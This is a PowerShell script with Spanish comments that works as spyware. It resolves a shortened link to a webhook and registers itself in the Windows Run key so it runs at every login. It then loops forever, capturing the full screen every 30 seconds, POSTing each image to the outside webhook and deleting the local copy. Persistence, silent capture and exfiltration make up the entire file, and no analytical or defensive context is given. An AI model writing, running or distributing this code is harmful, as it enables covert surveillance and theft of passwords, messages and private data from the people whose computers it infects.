$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas

# Detección de URL acortada
if ($hookurl.Length -le 121) {
    Write-Host "Shortened Webhook URL Detected..0."
    $hookurl = (Invoke-RestMethod -Uri $hookurl).url
}

# Ubicación del script
$scriptPath = $MyInvocation.MyCommand.Path

# Agregar entrada al registro de Windows para iniciar con el sistema
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "ScreenshotScript" -Value $scriptPath

do {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    
    $fileContent = Get-Content -Path $Filett -Encoding Byte -ReadCount 0
    Invoke-WebRequest -Uri $hookurl -Method POST -ContentType "image/png" -Body $fileContent

    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds
} while ($true)
